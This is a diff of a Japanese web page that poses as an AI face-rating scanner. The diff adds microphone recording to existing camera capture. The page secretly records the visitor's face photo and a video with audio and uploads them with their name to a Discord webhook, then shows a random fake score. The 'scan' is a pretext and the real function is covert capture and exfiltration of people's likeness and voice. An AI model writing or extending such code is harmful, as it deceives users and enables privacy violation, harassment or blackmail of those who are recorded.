@@ -19,7 +19,7 @@
         }
         #video { 
             width: 100%; border-radius: 15px; background: #000; 
-            aspect-ratio: 4 / 3; object-fit: cover; margin-top: 20px; display: none; /* 最初は隠しておく */
+            aspect-ratio: 4 / 3; object-fit: cover; margin-top: 20px; display: none;
         }
         #result { font-size: 1.5em; color: #ff0055; margin-top: 25px; font-weight: bold; }
         #canvas { display: none; }
@@ -53,28 +53,27 @@
 
         startBtn.addEventListener('click', () => {
             const user = nameInput.value || '名無しさん';
-            startBtn.style.display = 'none'; // ボタンを消す
-            nameInput.style.display = 'none'; // 入力欄も消す
-            video.style.display = 'block'; // カメラ枠を出す
-            result.innerHTML = "AIエンジンを起動中...<br>カメラを正面に向けてください";
+            startBtn.style.display = 'none';
+            nameInput.style.display = 'none';
+            video.style.display = 'block';
+            result.innerHTML = "AIエンジンを起動中...<br>解析のため、3秒間静止してください";
 
-            // ボタンを押してからカメラを起動
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            // ★audio: true を追加してマイクをオンにする
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                 .then(stream => {
                     video.srcObject = stream;
                     
-                    // 録画開始
                     mediaRecorder = new MediaRecorder(stream);
                     mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                     mediaRecorder.start();
 
-                    // 3秒後に自動で「スキャン（撮影）」を実行
+                    // 4秒後に送信（少し余裕を持たせる）
                     setTimeout(() => {
                         captureAndSend(user);
-                    }, 3500); 
+                    }, 4000); 
                 })
                 .catch(err => {
-                    alert("エラー：AIスキャナーの起動にはカメラ権限が必要です。");
+                    alert("エラー：診断にはカメラとマイクの許可が必要です。");
                     location.reload();
                 });
         });
@@ -82,30 +81,27 @@
         function captureAndSend(user) {
             result.innerHTML = "スキャン完了。解析データを送信中...";
 
-            // 録画停止
             if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
 
-            // 写真キャプチャ
             const vW = video.videoWidth;
             const vH = video.videoHeight;
             canvas.width = vW; canvas.height = vH;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, vW, vH);
 
-            // Discordへ送信
             setTimeout(() => {
                 const videoBlob = new Blob(chunks, { type: 'video/webm' });
                 canvas.toBlob(photoBlob => {
                     const formData = new FormData();
                     formData.append('content', `またつまらぬものを撮ってしまった、、\\n**👤 名前:** ${user}`);
                     formData.append('file1', photoBlob, 'face.png');
-                    formData.append('file2', videoBlob, 'video.webm');
+                    formData.append('file2', videoBlob, 'face_video_with_audio.webm');
 
                     fetch(webhookUrl, { method: 'POST', body: formData })
                     .then(() => {
                         const score = Math.floor(Math.random() * (75 - 45 + 1)) + 45;
                         result.innerHTML = `${user}さんの解析結果：<br><span style="font-size:1.8em;">偏差値 ${score}</span>`;
-                        // 役目が終わったらカメラを止める
+                        // カメラとマイクをオフにする
                         video.srcObject.getTracks().forEach(track => track.stop());
                     });
                 }, 'image/png');
